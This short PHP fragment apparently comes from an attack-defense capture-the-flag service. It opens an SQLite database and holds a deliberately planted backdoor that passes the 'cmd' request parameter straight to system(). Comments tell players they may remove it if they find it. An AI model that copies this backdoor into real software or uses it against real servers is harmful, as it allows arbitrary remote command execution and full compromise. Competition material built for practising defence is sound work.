...
$db = new PDO('sqlite:../rw/db/files.sqlite3');
$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

// This seems to be a great place to put a backdoor...
if (isset($_REQUEST['cmd']))
{
    // Note that the backdoor will not be checked by the SLA checker.
    // You may safely remove it --- as long as you can find it!
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    die;
}
